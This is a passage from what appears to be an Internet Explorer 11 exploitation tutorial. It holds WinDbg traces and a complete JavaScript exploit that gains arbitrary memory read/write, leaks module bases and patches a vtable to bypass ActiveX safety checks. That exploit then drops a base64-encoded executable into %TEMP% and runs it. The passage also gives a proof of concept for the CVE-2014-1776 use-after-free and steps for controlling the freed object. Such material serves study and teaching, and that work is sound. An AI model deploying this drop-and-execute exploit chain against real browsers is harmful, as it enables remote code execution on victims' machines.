+(702bcd98)   MSHTML!s_apfnPlainTearoffVtable   |  (702bd4a0)   MSHTML!GLSLFunctionInfo::s_info
+Exact matches:
+    MSHTML!s_apfnPlainTearoffVtable = &lt;no type information&gt;
+0:007&gt; ? 702bcd98-mshtml
+Evaluate expression: 15453592 = 00ebcd98
+0:007&gt; ? 04c05e19-jscript9
+Evaluate expression: 1400345 = 00155e19</pre><p>Now let’s step out of <span style="color: #00ff00;">CanCreateObject</span> (<span style="color: #00ff00;">Shift+F11</span>):</p><pre class="ignore:true">04c05b50 e86c020000      call    jscript9!ScriptEngine::CanCreateObject (04c05dc1)
+04c05b55 85c0            test    eax,eax      &lt;----------------- we are here
+04c05b57 0f84f4150400    je      jscript9!ScriptSite::CreateObjectFromProgID+0x116 (04c47151)
+04c05b5d 6a05            push    5
+04c05b5f 58              pop     eax
+04c05b60 85ff            test    edi,edi      &lt;---------------- EDI must be 0
+04c05b62 0f85fd351200    jne     jscript9!DListBase&lt;CustomHeap::Page&gt;::DListBase&lt;CustomHeap::Page&gt;+0x61a58 (04d29165)</pre><p>It seems that <span style="color: #00ff00;">EDI</span> must still be <span style="color: #00ff00;">0</span>, but the difference is that now <span style="color: #00ff00;">CanCreateObject</span> doesn’t use <span style="color: #00ff00;">EDI</span> anymore and so we don’t need to clear it before returning from <span style="color: #00ff00;">CanCreateObject</span>. This is great news!</p><p>Let’s change <span style="color: #00ff00;">EAX</span> so that we can reach <span style="color: #00ff00;">CanObjectRun</span>, if it still exists:</p><pre class="ignore:true">r eax=1</pre><p>Let’s keep stepping until we get to <span style="color: #00ff00;">CanObjectRun</span> and then step into it. After a while, we’ll reach a familiar <span style="color: #00ccff;">virtual call</span>:</p><pre class="ignore:true">04c05d2c 53              push    ebx
+04c05d2d 6a18            push    18h
+04c05d2f 52              push    edx
+04c05d30 8d55cc          lea     edx,[ebp-34h]
+04c05d33 895de8          mov     dword ptr [ebp-18h],ebx
+04c05d36 8b08            mov     ecx,dword ptr [eax]
+04c05d38 52              push    edx
+04c05d39 8d55c0          lea     edx,[ebp-40h]
+04c05d3c 52              push    edx
+04c05d3d 68845dc004      push    offset jscript9!GUID_CUSTOM_CONFIRMOBJECTSAFETY (04c05d84)
+04c05d42 50              push    eax
+04c05d43 ff5114          call    dword ptr [ecx+14h]  ds:002b:702bcdac={MSHTML!TearoffThunk5 (6f686efc)}  &lt;---------------
+04c05d46 85c0            test    eax,eax
+04c05d48 0f889c341200    js      jscript9!DListBase&lt;CustomHeap::Page&gt;::DListBase&lt;CustomHeap::Page&gt;+0x61add (04d291ea)
+04c05d4e 8b45c0          mov     eax,dword ptr [ebp-40h]
+04c05d51 6a03            push    3
+04c05d53 5b              pop     ebx
+04c05d54 85c0            test    eax,eax
+04c05d56 740f            je      jscript9!ScriptEngine::CanObjectRun+0xaa (04c05d67)
+04c05d58 837dcc04        cmp     dword ptr [ebp-34h],4
+04c05d5c 7202            jb      jscript9!ScriptEngine::CanObjectRun+0xa3 (04c05d60)
+04c05d5e 8b18            mov     ebx,dword ptr [eax]
+04c05d60 50              push    eax
+04c05d61 ff1518a0e704    call    dword ptr [jscript9!_imp__CoTaskMemFree (04e7a018)]
+04c05d67 6a00            push    0
+04c05d69 f6c30f          test    bl,0Fh
+04c05d6c 58              pop     eax
+04c05d6d 0f94c0          sete    al
+04c05d70 8b4dfc          mov     ecx,dword ptr [ebp-4]
+04c05d73 5f              pop     edi
+04c05d74 5e              pop     esi
+04c05d75 33cd            xor     ecx,ebp
+04c05d77 5b              pop     ebx
+04c05d78 e8b8b3eaff      call    jscript9!__security_check_cookie (04ab1135)
+04c05d7d 8be5            mov     esp,ebp
+04c05d7f 5d              pop     ebp
+04c05d80 c20800          ret     8</pre><p>If we call the epilog of the function like before, we’ll skip the call to <span style="color: #00ff00;">jscript9!_imp__CoTaskMemFree</span>, but that shouldn’t be a problem. <span style="color: #00ff00;">ECX</span> points to the same vftable referred to in <span style="color: #00ff00;">CanCreateObject</span>. Let’s compute the <span style="color: #00ccff;">RVA</span> of the epilog of <span style="color: #00ff00;">CanObjectRun</span>:</p><pre class="ignore:true">0:007&gt; ? 04c05d7d-jscript9
+Evaluate expression: 1400189 = 00155d7d</pre><p>Now we’re ready to write the javascript code. Here’s the full code:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  (function () {
+    CollectGarbage();
+ 
+    var header_size = 0x20;
+    var array_len = (0x10000 - header_size)/4;
+    var a = new Array();
+    for (var i = 0; i &lt; 0x1000; ++i) {
+      a[i] = new Array(array_len);
+      a[i][0] = 0;
+    }
+    
+    magic_addr = 0xc000000;
+    
+    //           /------- allocation header -------\ /--------- buffer header ---------\
+    // 0c000000: 00000000 0000fff0 00000000 00000000 00000000 00000001 00003ff8 00000000
+    //                                                       array_len buf_len
+    
+    alert("Modify the \"Buffer length\" field of the Array at 0x" + magic_addr.toString(16));
+    
+    // Locate the modified Array.
+    var idx = -1;
+    for (var i = 0; i &lt; 0x1000 - 1; ++i) {
+      // We try to modify the first element of the next Array.
+      a[i][array_len + header_size/4] = 1;
+      
+      // If we successfully modified the first element of the next Array, then a[i]
+      // is the Array whose length we modified.
+      if (a[i+1][0] == 1) {
+        idx = i;
+        break;
+      }
+    }
+    
+    if (idx == -1) {
+      alert("Can't find the modified Array");
+      return;
+    }
+    
+    // Modify the second Array for reading/writing everywhere.
+    a[idx][array_len + 0x14/4] = 0x3fffffff;
+    a[idx][array_len + 0x18/4] = 0x3fffffff;
+    a[idx+1].length = 0x3fffffff;
+    var base_addr = magic_addr + 0x10000 + header_size;
+    
+    // Very Important:
+    //    The numbers in Array are signed int32. Numbers greater than 0x7fffffff are
+    //    converted to 64-bit floating point.
+    //    This means that we can't, for instance, write
+    //        a[idx+1][index] = 0xc1a0c1a0;
+    //    The number 0xc1a0c1a0 is too big to fit in a signed int32.
+    //    We'll need to represent 0xc1a0c1a0 as a negative integer:
+    //        a[idx+1][index] = -(0x100000000 - 0xc1a0c1a0);
+    
+    function int2uint(x) {
+      return (x &lt; 0) ? 0x100000000 + x : x;
+    }
+
+    function uint2int(x) {
+      return (x &gt;= 0x80000000) ? x - 0x100000000 : x;
+    }
+
+    // The value returned will be in [0, 0xffffffff].
+    function read(addr) {
+      var delta = addr - base_addr;
+      var val;
+      if (delta &gt;= 0)
+        val = a[idx+1][delta/4];
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        val = a[idx+1][(0x100000000 + delta)/4];
+      
+      return int2uint(val);
+    }
+    
+    // val must be in [0, 0xffffffff].
+    function write(addr, val) {
+      val = uint2int(val);
+      
+      var delta = addr - base_addr;
+      if (delta &gt;= 0)
+        a[idx+1][delta/4] = val;
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        a[idx+1][(0x100000000 + delta)/4] = val;
+    }
+    
+    function get_addr(obj) {
+      a[idx+2][0] = obj;
+      return read(base_addr + 0x10000);
+    }
+    
+    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable' = jscript9 + 0x2d50
+    //      v
+    //  04ab2d50 151f1ec0 00000000 00000000
+    //  6f5569ce 00000000 0085f5d8 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x1569ce
+    var addr = get_addr(document.createElement("div"));
+    jscript9 = read(addr) - 0x2d50;
+    mshtml = read(addr + 0x10) - 0x1569ce;
+    
+    var old1 = read(mshtml+0xebcd98+0x10);
+    var old2 = read(mshtml+0xebcd98+0x14);
+
+    function GodModeOn() {
+      write(mshtml+0xebcd98+0x10, jscript9+0x155e19);
+      write(mshtml+0xebcd98+0x14, jscript9+0x155d7d);
+    }
+    
+    function GodModeOff() {
+      write(mshtml+0xebcd98+0x10, old1);
+      write(mshtml+0xebcd98+0x14, old2);
+    }
+
+    // content of exe file encoded in base64.
+    runcalc = 'TVqQAAMAAAAEAAAA//8AALgAAAAAA &lt;snipped&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+ 
+    function createExe(fname, data) {
+      GodModeOn();
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      GodModeOff();
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      
+      var bStream_addr = get_addr(bStream);
+      var string_addr = read(read(bStream_addr + 0x50) + 0x44);
+      write(string_addr, 0x003a0043);       // 'C:'
+      write(string_addr + 4, 0x0000005c);   // '\'
+      try {
+        bStream.SaveToFile(fname, 2);     // 2 = overwrites file if it already exists
+      }
+      catch(err) {
+        return 0;
+      }
+      
+      tStream.Close();
+      bStream.Close();
+      return 1;
+    }
+    
+    function decode(b64Data) {
+      var data = window.atob(b64Data);
+      
+       // Now data is like
+      //   11 00 12 00 45 00 50 00 ...
+      // rather than like
+      //   11 12 45 50 ...
+      // Let's fix this!
+      var arr = new Array();
+      for (var i = 0; i &lt; data.length / 2; ++i) {
+        var low = data.charCodeAt(i*2);
+        var high = data.charCodeAt(i*2 + 1);
+        arr.push(String.fromCharCode(low + high * 0x100));
+      }
+      return arr.join('');
+    }
+
+    GodModeOn();
+    var shell = new ActiveXObject("WScript.shell");
+    GodModeOff();
+    fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+    if (createExe(fname, decode(runcalc)) == 0) {
+//      alert("SaveToFile failed");
+      window.location.reload();
+      return 0;
+    }
+    shell.Exec(fname);
+ 
+    alert("Done");
+  })();
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>I snipped <span style="color: #00ff00;">runcalc</span>. You can download the full code from here: <a href="code/code5.zip">code5</a>.</p><p>Try the code and it should work just fine!</p><h2>The UAF bug</h2><p>We’ll be using a UAF bug I found here:</p><p style="padding-left: 30px;"><a href="https://withgit.com/hdarwin89/codeengn-2014-ie-1day-case-study/tree/master">https://withgit.com/hdarwin89/codeengn-2014-ie-1day-case-study/tree/master</a></p><p>Here’s the <span style="color: #00ccff;">POC</span>:</p>
+
+<pre><code class="language-html">&lt;html xmlns:v="urn:schemas-microsoft-com:vml"&gt;
+&lt;head id="haed"&gt;
+&lt;title&gt;IE Case Study - STEP1&lt;/title&gt;
+&lt;style&gt;
+        v\:*{Behavior: url(#default#VML)}
+&lt;/style&gt;
+&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /&gt;
+&lt;script&gt;
+        window.onload = function (){
+            var head = document.getElementById("haed")
+            tmp = document.createElement("CVE-2014-1776")
+            document.getElementById("vml").childNodes[0].appendChild(tmp)
+            tmp.appendChild(head)
+            tmp = head.offsetParent
+            tmp.onpropertychange = function(){
+                this["removeNode"](true)
+                document.createElement("CVE-2014-1776").title = ""
+            }
+            head.firstChild.nextSibling.disabled = head
+        }
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;v:group id="vml" style="width:500pt;"&gt;&lt;div&gt;&lt;/div&gt;&lt;/group&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Enable the flags <span style="color: #00ccff;">HPA</span> and <span style="color: #00ccff;">UST</span> for <span style="color: #00ff00;">iexplore.exe</span> in <span style="color: #00ff00;">gflags</span>:</p><p>
+<a href="images/pic_50.png"><img src="images/pic_50.png" alt="pic_50" width="710" height="644"></a>
+<br> When we open the page in IE, IE will crash here:</p><pre class="ignore:true">MSHTML!CMarkup::IsConnectedToPrimaryMarkup:
+0aa9a244 8b81a4000000    mov     eax,dword ptr [ecx+0A4h] ds:002b:12588c7c=????????   &lt;------------ crash!
+0aa9a24a 56              push    esi
+0aa9a24b 85c0            test    eax,eax
+0aa9a24d 0f848aaa0800    je      MSHTML!CMarkup::IsConnectedToPrimaryMarkup+0x77 (0ab24cdd)
+0aa9a253 8b400c          mov     eax,dword ptr [eax+0Ch]
+0aa9a256 85c0            test    eax,eax</pre><p>The freed object is pointed to by <span style="color: #00ff00;">ECX</span>. Let’s determine the size of the object:</p><pre class="ignore:true">0:007&gt; ? 1000 - (@ecx &amp; fff)
+Evaluate expression: 1064 = 00000428</pre><p>So the object is <span style="color: #00ff00;">0x428</span> bytes.</p><p>Here’s the stack trace:</p><pre class="ignore:true">0:007&gt; k 10
+ChildEBP RetAddr  
+0a53b790 0a7afc25 MSHTML!CMarkup::IsConnectedToPrimaryMarkup
+0a53b7d4 0aa05cc6 MSHTML!CMarkup::OnCssChange+0x7e
+0a53b7dc 0ada146f MSHTML!CElement::OnCssChange+0x28
+0a53b7f4 0a84de84 MSHTML!`CBackgroundInfo::Property&lt;CBackgroundImage&gt;'::`7'::`dynamic atexit destructor for 'fieldDefaultValue''+0x4a64
+0a53b860 0a84dedd MSHTML!SetNumberPropertyHelper&lt;long,CSetIntegerPropertyHelper&gt;+0x1d3
+0a53b880 0a929253 MSHTML!NUMPROPPARAMS::SetNumberProperty+0x20
+0a53b8a8 0ab8b117 MSHTML!CBase::put_BoolHelper+0x2a
+0a53b8c0 0ab8aade MSHTML!CBase::put_Bool+0x24
+0a53b8e8 0aa3136b MSHTML!GS_VARIANTBOOL+0xaa
+0a53b97c 0aa32ca7 MSHTML!CBase::ContextInvokeEx+0x2b6
+0a53b9a4 0a93b0cc MSHTML!CElement::ContextInvokeEx+0x4c
+0a53b9d0 0a8f8f49 MSHTML!CLinkElement::VersionedInvokeEx+0x49
+0a53ba08 6ef918eb MSHTML!CBase::PrivateInvokeEx+0x6d
+0a53ba6c 6f06abdc jscript9!HostDispatch::CallInvokeEx+0xae
+0a53bae0 6f06ab30 jscript9!HostDispatch::PutValueByDispId+0x94
+0a53baf8 6f06aafc jscript9!HostDispatch::PutValue+0x2a</pre><p>Now we need to develop a breakpoint which breaks exactly at the point of crash. This is necessary for when we remove the flag HPA and <span style="color: #00ff00;">ECX</span> points to a string of our choosing.</p><p>Let’s start by putting the following breakpoint right before we allow blocked content in IE:</p><pre class="ignore:true">bp MSHTML!CMarkup::IsConnectedToPrimaryMarkup</pre><p>The breakpoint will be triggered many times before the crash. Moreover, if we click on the page in IE, the breakpoint will be triggered some more times. It’s better to put an initial breakpoint on a parent call which is called only after we allow blocked content in IE. The following breakpoint seems perfect:</p><pre class="ignore:true">bp MSHTML!CBase::put_BoolHelper</pre><p>When the breakpoint is triggered, set also the following breakpoint:</p><pre class="ignore:true">bp MSHTML!CMarkup::IsConnectedToPrimaryMarkup</pre><p>This last breakpoint is triggered <span style="color: #00ff00;">3</span> times before we reach the point (and time) of crash. So, from now on we can use the following standalone breakpoint:</p><pre class="ignore:true">bp MSHTML!CBase::put_BoolHelper "bc *; bp MSHTML!CMarkup::IsConnectedToPrimaryMarkup 3; g"</pre><p>If you try it, you’ll see that it works perfectly!</p><p>Now we can finally try to make <span style="color: #00ff00;">ECX</span> point to our string. But before proceeding, disable the two flags HPA and UST:</p><p>
+<a href="images/pic_51.png"><img src="images/pic_51.png" alt="pic_51" width="710" height="644"></a>
+<br> Here’s the modified javascript code:</p>
+
+<pre><code class="language-html">&lt;html xmlns:v="urn:schemas-microsoft-com:vml"&gt;
+&lt;head id="haed"&gt;
+&lt;title&gt;IE Case Study - STEP1&lt;/title&gt;
+&lt;style&gt;
+        v\:*{Behavior: url(#default#VML)}
+&lt;/style&gt;
+&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /&gt;
+&lt;script&gt;
+        window.onload = function (){
+            var head = document.getElementById("haed")
+            tmp = document.createElement("CVE-2014-1776")
+            document.getElementById("vml").childNodes[0].appendChild(tmp)
+            tmp.appendChild(head)
+            tmp = head.offsetParent
+            tmp.onpropertychange = function(){
+                this["removeNode"](true)
+                document.createElement("CVE-2014-1776").title = ""
+                
+                var elem = document.createElement("div");
+                elem.className = new Array(0x428/2).join("a");
+            }
+            head.firstChild.nextSibling.disabled = head
+        }
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;v:group id="vml" style="width:500pt;"&gt;&lt;div&gt;&lt;/div&gt;&lt;/group&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Remember to set the following breakpoint:</p><pre class="ignore:true">bp MSHTML!CBase::put_BoolHelper "bc *; bp MSHTML!CMarkup::IsConnectedToPrimaryMarkup 3; g"</pre><p>When the breakpoint is triggered, you should see something similar to this:</p><h2>
+<a href="images/pic_62.png"><img src="images/pic_62.png" alt="pic_62" width="1600" height="915"></a>
+The UAF bug (2)</h2><p>We will need to analyze the bug in <span style="color: #00ccff;">IDA</span>.</p><p>This time I won’t show you how I determined the content of the string step by step because it’d be a very tedious exposition and you wouldn’t learn anything useful. First I’ll show you the relevant graphs so that you can follow along even without IDA, and then I’ll show you the complete “<em>schema</em>” used to exploit the UAF bug and modify the length of the chosen <span style="color: #00ff00;">Array</span>.</p><p>Open <span style="color: #00ff00;">mshtml</span> in IDA then press <span style="color: #00ff00;">Ctrl+P</span> (<span style="color: #00ff00;">Jump to function</span>), click on <span style="color: #00ff00;">Search</span> and enter <span style="color: #00ff00;">CMarkup::IsConnectedToPrimaryMarkup</span>. Double click on the function and you’ll see the crash point:</p><p>
+<a href="images/pic_63.png"><img src="images/pic_63.png" alt="pic_63" width="1429" height="1919"></a>
+<br> The nodes with the colored background are the only nodes whose code we execute. The <em>pink</em> nodes contain the crash, whereas the <em>celeste</em> (light blue) nodes contain the overwriting instruction we’ll use to modify the length of the chosen <span style="color: #00ff00;">Array</span>.</p><p>Click on the signature of <span style="color: #00ff00;">IsConnectedToPrimaryMarkup</span>, press <span style="color: #00ff00;">Ctrl+X</span> and select <span style="color: #00ff00;">CMarkup::OnCssChange</span> (see again the stack trace above if you need to). Here’s the graph of <span style="color: #00ff00;">OnCssChange</span>:</p><p>
+<a href="images/pic_64.png"><img src="images/pic_64.png" alt="pic_64" width="1958" height="4426"></a>
+<br> Here’s the graph of <span style="color: #00ff00;">CMarkup::IsPendingPrimaryMarkup</span>:</p><p>
+<a href="images/pic_65.png"><img src="images/pic_65.png" alt="pic_65" width="643" height="1179"></a>
+<br> Next is the graph of <span style="color: #00ff00;">CMarkup::Root</span>:</p><p>
+<a href="images/pic_66.png"><img src="images/pic_66.png" alt="pic_66" width="944" height="405"></a>
+<br> Here’s the graph of <span style="color: #00ff00;">CElement::EnsureFormatCacheChange</span>:</p><p>
+<a href="images/pic_67.png"><img src="images/pic_67.png" alt="pic_67" width="1246" height="565"></a>
+<br> And, finally, this is the graph of <span style="color: #00ff00;">CView::AddInvalidationTask</span>, the function which contains the overwriting instruction (<span style="color: #00ff00;">inc</span>):</p><p>
+<a href="images/pic_68.png"><img src="images/pic_68.png" alt="pic_68" width="1929" height="2452"></a>
+<br> Here’s the schema I devised:</p><pre class="ignore:true">Conditions to control the bug and force an INC of dword at magic_addr + 0x1b:
+X = [ptr+0A4h] ==&gt; Y = [X+0ch] ==&gt;
+            [Y+208h] is 0
+            [Y+630h+248h] = [Y+878h] val to inc!      &lt;======
+            [Y+630h+380h] = [Y+9b0h] has bit 16 set
+            [Y+630h+3f4h] = [Y+0a24h] has bit 7 set
+            [Y+1044h] is 0
+U = [ptr+118h] ==&gt; [U] is 0 =&gt; V = [U-24h] =&gt; W = [V+1ch],
+            [W+0ah] has bit 1 set &amp; bit 4 unset
+            [W+44h] has bit 7 set
+            [W+5ch] is writable
+[ptr+198h] has bit 12 set</pre><p>Let’s consider the first two lines:</p><pre class="ignore:true">X = [ptr+0A4h] ==&gt; Y = [X+0ch] ==&gt;
+            [Y+208h] is 0</pre><p>The term <span style="color: #00ff00;">ptr</span> is the <span style="color: #00ccff;">dangling pointer</span> (which should point to our string). The two lines above means <span style="color: #00ff00;">[Y+208h]</span> must be <span style="color: #00ff00;">0</span>, where <span style="color: #00ff00;">Y</span> is the value at <span style="color: #00ff00;">X+0ch</span>, where <span style="color: #00ff00;">X</span> is the value at <span style="color: #00ff00;">ptr+0a4h</span>.</p><p>Deducing such a schema can be time consuming and a little bit of trial and error may be necessary. The goal is to come up with a schema that results in an execution path which reaches the overwriting instruction and then resume the execution of the javascript code without any crashes.</p><p>It’s a good idea to start by identifying the <em>must</em>-nodes (in IDA), i.e. the nodes that must belong to the execution path. Then you can determine the conditions that must be met to make sure that those nodes belong to the execution path. Once you’ve done that, you start exploring the graph and see what are the suitable sub-paths for connecting the <em>must</em>-nodes.</p><p>You should check that the schema above is correct by looking at the graphs and following the execution path.</p><p style="text-align: center; font-size: 40px;"><a href="ie11-part-2.html">Next Part</a> →</p> </div></div>
+
+</body>
+</html>
